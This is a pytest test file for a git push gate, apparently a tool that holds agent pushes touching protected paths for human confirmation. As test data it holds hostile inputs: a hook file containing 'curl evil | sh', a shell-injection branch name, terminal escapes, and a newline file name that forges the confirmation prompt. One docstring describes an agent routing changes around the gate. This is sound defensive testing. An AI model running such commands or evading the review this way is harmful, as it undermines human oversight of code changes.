import io
import json
import re
import shlex
import stat
from concurrent.futures import ThreadPoolExecutor

import pytest

from conftest import TOKEN, commit, git, push
from git_gate import Refused
from git_gate.config import DEFAULT_HANDOVER_PATHS, Rules
from git_gate.handover import EXPIRES, Handover, Handovers, main, push_command
from git_gate.mirror import Mirror, comparison

REPO = "me/app"
DAY = 24 * 3600


class Clock:
    def __init__(self, now: float = 1_000_000.0):
        self.now = now

    def __call__(self) -> float:
        return self.now


@pytest.fixture(autouse=True)
def config_dir(env, monkeypatch):
    monkeypatch.setenv("GIT_GATE_CONFIG_DIR", str(env.cfg))


@pytest.fixture
def hs(env):
    return Handovers(env.state)


@pytest.fixture
def m(env):
    return Mirror(env.gate.git, env.state)


@pytest.fixture
def rules():
    return Rules(workspaces=(), repos={})


def sha(n: int = 1) -> str:
    return f"{n:x}".rjust(40, "a")


STORED = {"patterns": DEFAULT_HANDOVER_PATHS, "protected": (), "exclude": ()}


def make(hs: Handovers, **kw) -> Handover:
    args = {"repo": REPO, "branch": "feat", "sha": sha(), "base": None, "lease": None, "reason": "protected"}
    return hs.create(**(args | STORED | kw))


# --- records ------------------------------------------------------------------------------


def test_create_get_open_close(env, hs):
    h = make(hs, base=sha(2), lease=sha(3), reason="needs a force", protected=("a", "b"), exclude=(sha(3), sha(4)))
    assert (h.id, h.repo, h.branch, h.sha, h.base, h.lease) == (1, REPO, "feat", sha(), sha(2), sha(3))
    assert h.reason == "needs a force"
    assert (h.patterns, h.protected, h.exclude) == (DEFAULT_HANDOVER_PATHS, ("a", "b"), (sha(3), sha(4)))
    assert hs.get(h.id) == h
    other = make(hs, branch="topic")
    assert hs.open() == [h, other]
    record = env.state / "handovers" / f"{h.id}.json"
    assert stat.S_IMODE(record.stat().st_mode) == 0o600
    assert json.loads(record.read_text())["branch"] == "feat"
    hs.close(h.id)
    assert hs.open() == [other]
    with pytest.raises(Refused, match="No open handover 1"):
        hs.get(h.id)
    hs.close(h.id)  # closing twice is harmless


def test_ids_increase_and_old_ones_expire(env):
    clock = Clock()
    hs = Handovers(env.state, clock=clock)
    first, second = make(hs), make(hs)
    assert (first.id, second.id) == (1, 2)
    clock.now += 14 * DAY - 1
    assert hs.open() == [first, second]
    third = make(hs)
    assert third.id == 3
    assert hs.open() == [first, second, third]
    clock.now += 2
    assert [h.id for h in hs.open()] == [3]
    fourth = make(hs)
    assert fourth.id == 4  # ids are never reused
    assert not (env.state / "handovers/1.json").exists()
    with pytest.raises(Refused):
        hs.get(first.id)
    assert EXPIRES == 14 * DAY


def test_ids_are_unique_across_threads(env):
    def one(_):
        return make(Handovers(env.state)).id

    with ThreadPoolExecutor(8) as pool:
        ids = list(pool.map(one, range(40)))
    assert sorted(ids) == list(range(1, 41))
    assert len(Handovers(env.state).open()) == 40


def test_unreadable_record_is_not_open(env, hs):
    h = make(hs)
    (env.state / "handovers/9.json").write_text("{not json")
    (env.state / "handovers/10.json").write_text(json.dumps({"id": 10}))
    record = json.loads((env.state / f"handovers/{h.id}.json").read_text())
    without = {k: v for k, v in record.items() if k != "protected"}  # a record older than the stored list
    bad_exclude = record | {"exclude": ["main"]}
    bad_pattern = record | {"patterns": ["a\nb"]}
    bad_name = record | {"protected": [5]}
    for n, data in ((11, without), (12, bad_exclude), (13, bad_pattern), (14, bad_name)):
        (env.state / f"handovers/{n}.json").write_text(json.dumps(data | {"id": n}))
    assert hs.open() == [h]
    for bad in (9, 10, 11, 12, 13, 14):
        with pytest.raises(Refused, match="unreadable"):
            hs.get(bad)


# --- the command --------------------------------------------------------------------------


def test_push_command_shapes(tmp_path):
    mirror = tmp_path / "me/app.git"
    url = "git@github.com:me/app.git"
    plain = Handover(1, REPO, "feat", sha(), None, None, "protected", 0.0, (), (), ())
    assert push_command(plain, mirror, url) == [
        "git", "-c", "core.hooksPath=/dev/null", f"--git-dir={mirror}", "push", url, f"{sha()}:refs/heads/feat",
    ]  # fmt: skip
    rewrite = Handover(2, REPO, "feat", sha(), sha(2), sha(3), "rewrite", 0.0, (), (), ())
    assert push_command(rewrite, mirror, url) == [
        "git", "-c", "core.hooksPath=/dev/null", f"--git-dir={mirror}", "push",
        f"--force-with-lease=refs/heads/feat:{sha(3)}", url, f"{sha()}:refs/heads/feat",
    ]  # fmt: skip


# --- main ----------------------------------------------------------------------------------


def run(env, argv: list[str], answer: str = "") -> tuple[int, str]:
    out = io.StringIO()
    code = main(argv, stdin=io.StringIO(answer), stdout=out, base_url=env.gate.git.base_url)
    return code, out.getvalue()


def stage(env, m, rules, checkout, branch="feat", *, base=None, lease=None, reason="protected branch"):
    """Commit on `branch`, import it into the mirror as a push would, pin it and record the handover."""
    git("switch", "-q", "-c", branch, cwd=checkout)
    commit(checkout, f"{branch}.txt", message=f"add {branch}")
    return stage_here(env, m, rules, checkout, branch, base=base, lease=lease, reason=reason)


def stage_here(env, m, rules, checkout, branch, *, base=None, lease=None, reason="protected branch", repo=REPO):
    """Like `stage`, for a branch already checked out with its commits made."""
    path = env.state / "staging" / f"{branch}.bundle"
    git("bundle", "create", "-q", str(path), branch, "--not", "--remotes=origin", cwd=checkout)
    with m.lock(repo):
        heads = m.sync(repo, TOKEN, rules)
        tip = m.import_bundle(repo, path, branch, rules)
    return record(env, m, rules, heads, branch, tip, base=base, lease=lease, reason=reason, repo=repo)


def record(env, m, rules, heads, branch, tip, *, base=None, lease=None, reason="protected", repo=REPO, **stored):
    """Record and pin a handover the way the gate's push does, storing what `protected_changes` found."""
    remote, default = heads.get(branch), heads.get("main")
    found = m.protected_changes(repo, tip, remote, default, DEFAULT_HANDOVER_PATHS, rules)
    kw = {"patterns": DEFAULT_HANDOVER_PATHS, "protected": found.files, "exclude": comparison(remote, default)}
    with m.lock(repo):
        h = Handovers(env.state).create(repo, branch, tip, base, lease, reason, **(kw | stored))
        m.keep(repo, h.ref, tip, rules)
    return h


def remote_has(env, branch: str) -> str | None:
    found = env.api.branch(REPO, branch)
    return found and found["sha"]


def mirror_refs(m) -> str:
    return git(f"--git-dir={m.path(REPO)}", "for-each-ref", "--format=%(refname)", "refs/gate/handover/")


def test_main_lists_open(env, hs):
    assert run(env, []) == (0, "no open handovers\n")
    a = make(hs, reason="protected branch")
    b = make(hs, repo="other/lib", branch="topic/x", reason="touches .github/workflows/ci.yml")
    code, out = run(env, [])
    lines = out.splitlines()
    assert code == 0 and len(lines) == 2
    for line, h in zip(lines, (a, b), strict=True):
        assert line.split()[0] == str(h.id)
        assert h.repo in line and h.branch in line and h.reason in line


def test_main_confirms_then_pushes(env, m, rules, checkout):
    h = stage(env, m, rules, checkout)
    tip = h.sha
    code, out = run(env, [str(h.id)], "n\n")
    assert code == 1 and "add feat" in out and "feat.txt" in out
    assert remote_has(env, "feat") is None
    assert [x.id for x in Handovers(env.state).open()] == [h.id]
    assert mirror_refs(m) == f"refs/gate/handover/{h.id}"

    for answer in ("", "yep\n", "\n"):
        assert run(env, [str(h.id)], answer)[0] == 1
    assert remote_has(env, "feat") is None

    code, out = run(env, [str(h.id)], "y\n")
    assert code == 0, out
    assert remote_has(env, "feat") == tip
    assert Handovers(env.state).open() == []
    assert mirror_refs(m) == ""
    assert run(env, [str(h.id)], "y\n")[0] == 1  # already done


def test_main_rewrite_uses_lease(env, m, rules, checkout):
    git("push", "-q", env.url, "main:refs/heads/feat", cwd=env.tmp / "seed")
    old = remote_has(env, "feat")
    h = stage(env, m, rules, checkout, lease=old, base=old, reason="rewrites history")
    code, out = run(env, [str(h.id)], "y\n")
    assert code == 0, out
    assert remote_has(env, "feat") == h.sha


def test_main_lease_refuses_when_remote_moved(env, m, rules, checkout):
    seed = env.tmp / "seed"
    git("push", "-q", env.url, "main:refs/heads/feat", cwd=seed)
    old = remote_has(env, "feat")
    h = stage(env, m, rules, checkout, lease=old, base=old, reason="rewrites history")
    moved = commit(seed, "moved.txt")
    git("push", "-q", "-f", env.url, f"{moved}:refs/heads/feat", cwd=seed)
    code, out = run(env, [str(h.id)], "y\n")
    assert code != 0 and "stale info" in out
    assert remote_has(env, "feat") == moved
    assert [x.id for x in Handovers(env.state).open()] == [h.id]


def test_main_keeps_handover_when_push_fails(env, m, rules, checkout):
    h = stage(env, m, rules, checkout)
    seed = env.tmp / "seed"
    other = commit(seed, "elsewhere.txt")
    git("push", "-q", env.url, f"{other}:refs/heads/feat", cwd=seed)  # the remote moved since
    code, out = run(env, [str(h.id)], "y\n")
    assert code != 0
    assert "! [rejected]" in out and "-> feat" in out
    assert "still open" in out
    assert remote_has(env, "feat") == other
    assert [x.id for x in Handovers(env.state).open()] == [h.id]
    assert mirror_refs(m) == f"refs/gate/handover/{h.id}"


def test_main_shows_base_range_and_stat(env, m, rules, checkout):
    base = git("rev-parse", "HEAD", cwd=checkout)
    h = stage(env, m, rules, checkout, base=base)
    _, out = run(env, [str(h.id)], "n\n")
    assert "add feat" in out and "feat.txt" in out and "README.md" not in out
    assert h.sha[:12] in out and REPO in out and "feat" in out


def test_main_strips_terminal_escapes(env, m, rules, checkout):
    git("switch", "-q", "-c", "evil", cwd=checkout)
    commit(checkout, "e.txt", message="innocent \x1b[2J\x1b]0;pwned\x07 subject")
    git(
        "bundle",
        "create",
        "-q",
        str(env.state / "staging" / "evil.bundle"),
        "evil",
        "--not",
        "--remotes=origin",
        cwd=checkout,
    )
    with m.lock(REPO):
        heads = m.sync(REPO, TOKEN, rules)
        tip = m.import_bundle(REPO, env.state / "staging" / "evil.bundle", "evil", rules)
    h = record(env, m, rules, heads, "evil", tip)
    _, out = run(env, [str(h.id)], "n\n")
    assert "innocent" in out and "subject" in out
    assert "\x1b" not in out and "\x07" not in out


def test_main_refuses_bad_input(env, hs):
    h = make(hs)
    for argv in (["x"], ["1", "2"], ["-1"], ["99"]):
        code, out = run(env, argv, "y\n")
        assert code != 0 and out.strip(), argv
    assert run(env, ["99"])[1].startswith("No open handover 99")
    bad = make(hs, branch="-x")
    assert run(env, [str(bad.id)], "y\n")[0] != 0
    bad = make(hs, sha="HEAD")
    assert run(env, [str(bad.id)], "y\n")[0] != 0
    assert [x.id for x in hs.open()] == [h.id, 2, 3]


def test_main_refuses_when_mirror_lost_the_commit(env, hs):
    h = make(hs)
    code, out = run(env, [str(h.id)], "y\n")
    assert code != 0 and "no longer" in out
    assert [x.id for x in hs.open()] == [h.id]


def test_push_ref_is_dropped_only_after_success(env, m, rules, checkout):
    h = stage(env, m, rules, checkout)
    assert run(env, [str(h.id)], "n\n")[0] == 1
    assert git(f"--git-dir={m.path(REPO)}", "rev-parse", f"refs/gate/handover/{h.id}") == h.sha


# --- fix round 1: records and ids -----------------------------------------------------------


def test_deleted_counter_never_overwrites_open_records(env, hs):
    a, b = make(hs), make(hs, branch="topic")
    (env.state / "handovers/next").unlink()
    c = make(hs, branch="third")
    assert c.id == 3
    assert hs.open() == [a, b, c]


def test_corrupt_counter_is_recovered(env, hs):
    a = make(hs)
    (env.state / "handovers/next").write_text("not a number\x00")
    b = make(hs)
    assert b.id == 2
    assert hs.get(a.id) == a
    (env.state / "handovers/next").write_text("")
    assert make(hs).id == 3


def test_stale_counter_never_overwrites_existing_record(env, hs):
    """A crash between writes (or a restored counter) leaves `next` behind the records."""
    a, b = make(hs), make(hs)
    (env.state / "handovers/next").write_text("1\n")
    c = make(hs, branch="third")
    assert c.id == 3
    assert hs.get(a.id) == a and hs.get(b.id) == b
    assert int((env.state / "handovers/next").read_text()) == 4


def test_unreadable_record_files_still_reserve_their_id(env, hs):
    (env.state / "handovers").mkdir()
    (env.state / "handovers/7.json").write_text("{broken")
    assert make(hs).id == 8
    assert (env.state / "handovers/7.json").read_text() == "{broken"


def test_counter_is_written_before_the_record(env, hs, monkeypatch):
    """If writing the record fails, the id is spent rather than reused."""
    make(hs)

    def boom(self, h):
        raise OSError("disk full")

    monkeypatch.setattr(Handovers, "_write", boom)
    with pytest.raises(OSError):
        make(hs)
    monkeypatch.undo()
    assert make(hs).id == 3


def test_purging_an_expired_handover_drops_its_mirror_ref(env, m, rules, checkout):
    clock = Clock(1_000_000.0)
    git("switch", "-q", "-c", "feat", cwd=checkout)
    commit(checkout, "feat.txt")
    git(
        "bundle",
        "create",
        "-q",
        str(env.state / "staging" / "f.bundle"),
        "feat",
        "--not",
        "--remotes=origin",
        cwd=checkout,
    )
    with m.lock(REPO):
        m.sync(REPO, TOKEN, rules)
        tip = m.import_bundle(REPO, env.state / "staging" / "f.bundle", "feat", rules)
        old = Handovers(env.state, clock=clock, mirror=m).create(REPO, "feat", tip, None, None, "protected", **STORED)
        m.keep(REPO, old.ref, tip, rules)
    assert mirror_refs(m) == old.ref

    hs = Handovers(env.state, clock=Clock(clock.now + 10 * DAY), mirror=m)
    young = hs.create(REPO, "feat", tip, None, None, "protected", **STORED)
    with m.lock(REPO):
        m.keep(REPO, young.ref, tip, rules)
    assert sorted(mirror_refs(m).split()) == [old.ref, young.ref]  # not expired yet

    hs = Handovers(env.state, clock=Clock(clock.now + 15 * DAY), mirror=m)
    hs.create(REPO, "other", tip, None, None, "protected", **STORED)
    assert mirror_refs(m) == young.ref  # old expired and dropped; young (5 days old) kept


def test_purge_ignores_missing_mirror_and_ref(env, m):
    clock = Clock()
    hs = Handovers(env.state, clock=clock, mirror=m)
    make(hs, repo="me/never-mirrored")
    make(hs, repo="not a repo")  # a record the mirror refuses to name
    clock.now += 15 * DAY
    fresh = make(hs)
    assert hs.open() == [fresh]


# --- fix round 1: re-checking after the prompt ----------------------------------------------


class Meddler:
    """A stdin whose answer arrives after the record was rewritten, as a concurrent edit would."""

    def __init__(self, rewrite, answer="y\n"):
        self.rewrite, self.answer = rewrite, answer

    def readline(self) -> str:
        self.rewrite()
        return self.answer


def run_with(env, argv, stdin) -> tuple[int, str]:
    out = io.StringIO()
    code = main(argv, stdin=stdin, stdout=out, base_url=env.gate.git.base_url)
    return code, out.getvalue()


def test_main_refuses_a_record_changed_after_it_was_shown(env, m, rules, checkout):
    h = stage(env, m, rules, checkout)
    path = env.state / f"handovers/{h.id}.json"
    main_sha = remote_has(env, "main")  # a commit the mirror has, so only the record differs

    def rewrite():
        data = json.loads(path.read_text())
        path.write_text(json.dumps(data | {"sha": main_sha}))

    code, out = run_with(env, [str(h.id)], Meddler(rewrite))
    assert code != 0 and "changed while waiting; run it again" in out
    assert remote_has(env, "feat") is None
    assert remote_has(env, "main") == main_sha


def test_main_refuses_a_record_that_vanished_after_it_was_shown(env, m, rules, checkout):
    h = stage(env, m, rules, checkout)
    code, out = run_with(env, [str(h.id)], Meddler(lambda: Handovers(env.state).close(h.id)))
    assert code != 0 and "No open handover" in out
    assert remote_has(env, "feat") is None


# --- fix round 1: showing it safely ---------------------------------------------------------


def test_main_prints_a_command_that_shlex_splits_back_to_the_argv(env, m, rules, checkout):
    branch = "a;touch$x'q\"`id`|&b"
    h = stage(env, m, rules, checkout, branch)
    _, out = run(env, [str(h.id)], "n\n")
    line = next(x for x in out.splitlines() if x.startswith("Run: "))
    url = env.gate.git.user_push_url(REPO)
    assert shlex.split(line.removeprefix("Run: ")) == push_command(h, m.path(REPO), url)


def test_main_refuses_unprintable_branch_names(env, hs):
    bad = make(hs, branch="feat‮b")
    code, out = run(env, [str(bad.id)], "y\n")
    assert code != 0 and "unprintable" in out
    assert "‮" not in out


def test_main_says_how_many_commits_are_not_shown(env, m, rules, checkout):
    git("switch", "-q", "-c", "big", cwd=checkout)
    for i in range(55):
        git("commit", "-q", "--allow-empty", "-m", f"step {i}", cwd=checkout)
    git(
        "bundle",
        "create",
        "-q",
        str(env.state / "staging" / "big.bundle"),
        "big",
        "--not",
        "--remotes=origin",
        cwd=checkout,
    )
    base = git("rev-parse", "origin/main", cwd=checkout)
    with m.lock(REPO):
        heads = m.sync(REPO, TOKEN, rules)
        tip = m.import_bundle(REPO, env.state / "staging" / "big.bundle", "big", rules)
    h = record(env, m, rules, heads, "big", tip, base=base)
    _, out = run(env, [str(h.id)], "n\n")
    assert "step 54" in out and "step 5" in out
    assert "step 4\n" not in out
    assert "5 more commits not shown" in out
    git("switch", "-q", "main", cwd=checkout)
    small = stage(env, m, rules, checkout, "small", base=base)
    _, out = run(env, [str(small.id)], "n\n")
    assert "add small" in out and "more commits" not in out


def test_main_lists_every_file_the_push_changes(env, m, rules, checkout):
    """The file list covers all new commits together, so an early commit cannot hide behind the log's cap."""
    git("switch", "-q", "-c", "wide", cwd=checkout)
    commit(checkout, ".github/workflows/hidden.yml", "on: push", message="innocent")
    for i in range(60):
        git("commit", "-q", "--allow-empty", "-m", f"filler {i}", cwd=checkout)
    for i in range(105):
        (checkout / f"bulk/f{i:03}.txt").parent.mkdir(exist_ok=True)
        (checkout / f"bulk/f{i:03}.txt").write_text("x")
    git("add", "bulk", cwd=checkout)
    git("commit", "-q", "-m", "bulk", cwd=checkout)
    git(
        "bundle",
        "create",
        "-q",
        str(env.state / "staging" / "w.bundle"),
        "wide",
        "--not",
        "--remotes=origin",
        cwd=checkout,
    )
    base = git("rev-parse", "origin/main", cwd=checkout)
    with m.lock(REPO):
        heads = m.sync(REPO, TOKEN, rules)
        tip = m.import_bundle(REPO, env.state / "staging" / "w.bundle", "wide", rules)
    h = record(env, m, rules, heads, "wide", tip, base=base, reason="touches .github/workflows")
    _, out = run(env, [str(h.id)], "n\n")
    assert "12 more commits not shown" in out
    assert "innocent" not in out  # the log is capped ...
    assert ".github/workflows/hidden.yml" in out  # ... the file list is not hiding it
    assert "and 6 more files" in out
    assert "106 files changed" in out


def test_main_without_base_lists_everything_and_says_so(env, m, rules, checkout):
    """With no base recorded nothing can be assumed to be already on GitHub."""
    h = stage(env, m, rules, checkout, "fresh")
    _, out = run(env, [str(h.id)], "n\n")
    assert "No base was recorded" in out and "everything in the commit's history" in out
    assert "fresh.txt" in out and "README.md" in out and "2 files changed" in out


def test_main_without_base_discloses_changes_staged_on_another_mirrored_branch(env, m, rules, checkout):
    """An agent can push `agent` through the gate, then hand over a branch built on it."""
    git("switch", "-q", "-c", "agent", cwd=checkout)
    commit(checkout, ".github/workflows/evil.yml", "on: push")
    git("push", "-q", env.url, "agent", cwd=checkout)
    git("fetch", "-q", "origin", cwd=checkout)
    git("switch", "-q", "-c", "innocent", cwd=checkout)
    commit(checkout, "innocent.txt")
    h = stage_here(env, m, rules, checkout, "innocent")
    _, out = run(env, [str(h.id)], "n\n")
    assert ".github/workflows/evil.yml" in section(out)


def test_main_without_base_and_unrelated_history_lists_the_whole_tree(env, m, rules, checkout):
    git("switch", "-q", "--orphan", "lonely", cwd=checkout)
    commit(checkout, "lonely.txt")
    h = stage_here(env, m, rules, checkout, "lonely")
    _, out = run(env, [str(h.id)], "n\n")
    assert "lonely.txt" in out and "1 file changed" in out


def test_main_without_base_and_an_empty_mirror_uses_the_empty_tree(env, m, rules):
    git("init", "-q", "--bare", str(env.remote / "me/empty.git"))
    src = env.tmp / "empty-src"
    git("init", "-q", str(src))
    commit(src, "a.txt")
    commit(src, "b.txt")
    git("bundle", "create", "-q", str(env.state / "staging" / "e.bundle"), "main", cwd=src)
    with m.lock("me/empty"):
        heads = m.sync("me/empty", TOKEN, rules)
        tip = m.import_bundle("me/empty", env.state / "staging" / "e.bundle", "main", rules)
    h = record(env, m, rules, heads, "main", tip, repo="me/empty")
    _, out = run(env, [str(h.id)], "n\n")
    assert "a.txt" in out and "b.txt" in out and "2 files changed" in out


def test_main_with_nothing_new_lists_no_files(env, m, rules):
    heads = m.sync(REPO, TOKEN, rules)
    h = record(env, m, rules, heads, "again", heads["main"], base=heads["main"])
    _, out = run(env, [str(h.id)], "n\n")
    assert "New commits: none." in out and "Files under handover paths: none." in out and "README.md" not in out


def test_main_names_a_protected_file_changed_and_changed_back(env, m, rules, checkout):
    """A net tree diff is empty for the file; the commits being pushed still touched it."""
    git("switch", "-q", "-c", "roundtrip", cwd=checkout)
    commit(checkout, ".githooks/pre-push", "curl evil | sh")
    git("rm", "-q", ".githooks/pre-push", cwd=checkout)
    git("commit", "-q", "-m", "tidy", cwd=checkout)
    commit(checkout, "ok.txt")
    h = stage_here(env, m, rules, checkout, "roundtrip", base=git("rev-parse", "origin/main", cwd=checkout))
    _, out = run(env, [str(h.id)], "n\n")
    assert ".githooks/pre-push" in section(out) and "paths (1)" in section(out)


def test_main_names_symlinks_that_reach_handover_paths(env, m, rules, checkout):
    git("switch", "-q", "-c", "links", cwd=checkout)
    (checkout / ".githooks").symlink_to("elsewhere")
    (checkout / "docs").mkdir()
    (checkout / "docs/link").symlink_to("../README.md")
    git("add", "-A", cwd=checkout)
    git("commit", "-q", "-m", "links", cwd=checkout)
    h = stage_here(env, m, rules, checkout, "links", base=git("rev-parse", "origin/main", cwd=checkout))
    _, out = run(env, [str(h.id)], "n\n")
    assert ".githooks  (symlink)" in section(out)
    assert "docs/link" not in section(out)


def test_main_names_a_symlink_the_push_did_not_change(env, m, rules, checkout):
    """Every symlink in the pushed tip counts, not only the ones this push touched."""
    git("switch", "-q", "-c", "links", cwd=checkout)
    (checkout / ".github").symlink_to("elsewhere")
    git("add", "-A", cwd=checkout)
    git("commit", "-q", "-m", "link", cwd=checkout)
    first = git("rev-parse", "HEAD", cwd=checkout)
    commit(checkout, "later.txt")
    h = stage_here(env, m, rules, checkout, "links", base=first)
    _, out = run(env, [str(h.id)], "n\n")
    assert ".github  (symlink)" in section(out)


def section(out: str) -> str:
    """The "Files under handover paths" block: its heading to the next blank line."""
    start = out.index("Files under handover paths")
    return out[start : out.index("\n\n", start)]


def bulk_commit(checkout, protected: str, count: int = 120):
    """`count` files that sort before .github, then one protected file that sorts past the stat cap."""
    for i in range(count):
        f = checkout / "-bulk" / f"f{i:03}.txt"
        f.parent.mkdir(exist_ok=True)
        f.write_text("x")
    f = checkout / protected
    f.parent.mkdir(parents=True, exist_ok=True)
    f.write_text("on: push")
    git("add", "-A", cwd=checkout)
    git("commit", "-q", "-m", "bulk", cwd=checkout)


def test_main_names_handover_path_files_past_the_stat_cap(env, m, rules, checkout):
    git("switch", "-q", "-c", "wide", cwd=checkout)
    bulk_commit(checkout, ".github/workflows/x.yml")
    h = stage_here(env, m, rules, checkout, "wide", base=git("rev-parse", "origin/main", cwd=checkout))
    _, out = run(env, [str(h.id)], "n\n")
    assert "21 more files not listed" in out
    listing = out[: out.index("-bulk/f000")]
    assert "Files under handover paths" in listing and ".github/workflows/x.yml" in listing


def test_main_flattens_file_names_with_newlines_in_the_handover_list(env, m, rules, checkout):
    git("switch", "-q", "-c", "nl", cwd=checkout)
    commit(checkout, ".githooks/a\nPush it? [y/N] forged", "x")
    h = stage_here(env, m, rules, checkout, "nl", base=git("rev-parse", "origin/main", cwd=checkout))
    _, out = run(env, [str(h.id)], "n\n")
    assert "\nPush it? [y/N] forged" not in out and ".githooks/a?Push it? [y/N] forged" in out


GOOD = {"repo": REPO, "branch": "feat", "sha": sha(), "base": sha(2), "lease": sha(3)} | STORED


WHY = {"repo": "bad repository", "sha": "not a commit SHA", "base": "not a commit SHA", "lease": "not a commit SHA"}


@pytest.mark.parametrize("field", ["repo", "sha", "base", "lease", "branch"])
def test_main_refuses_values_that_would_print_differently_from_what_runs(env, hs, field):
    """re.match lets a trailing newline through `$`; the printed command would then differ from the argv."""
    h = hs.create(**(GOOD | {field: GOOD[field] + "\n"}), reason="protected")
    code, out = run(env, [str(h.id)], "y\n")
    assert code != 0 and out.startswith("Handover") and WHY.get(field, "branch") in out
    assert "Run:" not in out and "Push it?" not in out


@pytest.mark.parametrize("field", ["sha", "base", "lease"])
def test_main_refuses_unprintable_or_odd_shas(env, hs, field):
    for bad in (sha() + "‮", "A" * 40, "g" * 40, sha()[:-1]):
        h = hs.create(**(GOOD | {field: bad}), reason="protected")
        code, out = run(env, [str(h.id)], "y\n")
        assert code != 0 and "not a commit SHA" in out and "Run:" not in out


def test_main_refuses_the_null_sha(env, hs):
    h = make(hs, sha="0" * 40)
    code, out = run(env, [str(h.id)], "y\n")
    assert code != 0 and "not a commit SHA" in out and "Run:" not in out


@pytest.mark.parametrize("bad", ["‮", "‪", "⁦", "​", "­", "\r", "\x1b", "\x9b", "\x07", "﻿", ""])
def test_main_flattens_unprintable_characters(env, hs, bad):
    h = make(hs, reason=f"a{bad}b\nc")
    code, out = run(env, [])
    assert code == 0 and out.count("\n") == 1  # the reason is one line
    assert f"a{bad}b" not in out and "a?b?c" in out
    code, out = run(env, [str(h.id)], "n\n")
    assert bad not in out


def test_main_keeps_git_output_lines_but_cleans_them(env, m, rules, checkout):
    git("switch", "-q", "-c", "evil", cwd=checkout)
    commit(checkout, "e.txt", message="one ‮​\r\x9b subject")
    commit(checkout, "f.txt", message="second")
    git(
        "bundle",
        "create",
        "-q",
        str(env.state / "staging" / "evil.bundle"),
        "evil",
        "--not",
        "--remotes=origin",
        cwd=checkout,
    )
    with m.lock(REPO):
        heads = m.sync(REPO, TOKEN, rules)
        tip = m.import_bundle(REPO, env.state / "staging" / "evil.bundle", "evil", rules)
    h = record(env, m, rules, heads, "evil", tip, reason="pro\u202etected")
    _, out = run(env, [str(h.id)], "n\n")
    assert "pro?tected" in out
    assert "one ??" in out and "? subject" in out and "second" in out  # git itself splits the subject at \r
    assert not any(c in out for c in "‮​\r\x9b")


# --- the confirmation shows the record as stored --------------------------------------------


def test_main_prints_stored_protected_files_first_and_uncapped(env, m, rules, checkout, monkeypatch):
    monkeypatch.setenv("GIT_GATE_CONFIG_DIR", str(env.tmp / "no-such-config"))
    names = tuple(f".github/workflows/w{i:03}.yml" for i in range(150))
    git("switch", "-q", "-c", "feat", cwd=checkout)
    commit(checkout, "feat.txt")
    h = stage_here(env, m, rules, checkout, "feat")
    path = env.state / f"handovers/{h.id}.json"
    path.write_text(json.dumps(json.loads(path.read_text()) | {"protected": list(names)}))
    _, out = run(env, [str(h.id)], "n\n")
    head = out[: out.index("New commits")]
    assert "Files under handover paths (150):" in head
    assert all(f"  {name}\n" in head for name in names)
    assert "Note:" not in out


def test_main_always_prints_the_protected_section(env, m, rules, checkout):
    h = stage(env, m, rules, checkout)
    assert h.protected == ()
    _, out = run(env, [str(h.id)], "n\n")
    assert "Files under handover paths: none." in out


def test_main_discloses_a_rollback_merge(env, checkout):
    """The gate refuses a merge that keeps an older workflow; the screen must name that workflow."""
    seed = env.tmp / "seed"
    commit(seed, ".github/workflows/ci.yml", "v1", message="v1")
    git("push", "-q", env.url, "main", cwd=seed)
    git("fetch", "-q", "origin", cwd=checkout)
    git("switch", "-q", "-c", "feat", "origin/main", cwd=checkout)
    commit(seed, ".github/workflows/ci.yml", "v2", message="v2 fix")
    git("push", "-q", env.url, "main", cwd=seed)
    commit(checkout, "a.txt", message="feature")
    git("fetch", "-q", "origin", cwd=checkout)
    git("merge", "-q", "--no-ff", "-s", "ours", "origin/main", "-m", "merge main (keeps v1)", cwd=checkout)
    with pytest.raises(Refused) as e:
        push(env, checkout, "feat")
    id = int(re.findall(r"gitgatepush (\d+)", str(e.value))[0])
    code, out = run(env, [str(id)], "n\n")
    assert code == 1
    assert "Files under handover paths (1):\n  .github/workflows/ci.yml\n" in out


def test_main_rewrite_lists_what_it_removes(env, checkout):
    git("switch", "-q", "-c", "feat", cwd=checkout)
    commit(checkout, "one.txt", message="first doomed commit")
    commit(checkout, "two.txt", message="second doomed commit")
    assert "Pushed" in push(env, checkout, "feat")
    git("reset", "-q", "--hard", "origin/main", cwd=checkout)
    commit(checkout, "three.txt", message="the replacement")
    with pytest.raises(Refused) as e:
        push(env, checkout, "feat")
    id = int(re.findall(r"gitgatepush (\d+)", str(e.value))[0])
    _, out = run(env, [str(id)], "n\n")
    assert "REPLACES" in out and "Removes 2 commit(s) from feat:" in out
    assert "first doomed commit" in out and "second doomed commit" in out
    assert out.index("Removes 2") < out.index("Files under handover paths") < out.index("New commits (1):")
    assert out.index("New commits (1):") < out.index("the replacement")


def test_main_second_run_of_a_closed_id(env, m, rules, checkout):
    h = stage(env, m, rules, checkout)
    assert run(env, [str(h.id)], "y\n")[0] == 0
    code, out = run(env, [str(h.id)], "y\n")
    assert code == 1 and "No open handover" in out


def test_main_survives_non_utf8_names(env, m, rules, checkout):
    """Names and messages that are not UTF-8 print as "?", never as a traceback."""
    git("switch", "-q", "-c", "raw", cwd=checkout)
    blob = git("hash-object", "-w", "--stdin", cwd=checkout, input="x\n")
    git("update-index", "--add", "--cacheinfo", f"100644,{blob},.githooks/\udcff", cwd=checkout)
    git("commit", "-q", "-m", "bad \udcfe subject", cwd=checkout)
    h = stage_here(env, m, rules, checkout, "raw")
    assert h.protected == (".githooks/\udcff",)
    assert Handovers(env.state).get(h.id) == h  # the record keeps the name through JSON
    code, out = run(env, [str(h.id)], "n\n")
    assert code == 1 and "Not pushed" in out  # declined, not crashed
    assert "  .githooks/?\n" in out and "bad " in out and " subject" in out  # git re-encodes the message
    assert not any(0xD800 <= ord(c) <= 0xDFFF for c in out)


def test_main_ids_fullmatch(env, hs):
    h = make(hs)
    code, out = run(env, [f"{h.id}\n"], "y\n")
    assert code == 2 and "usage" in out
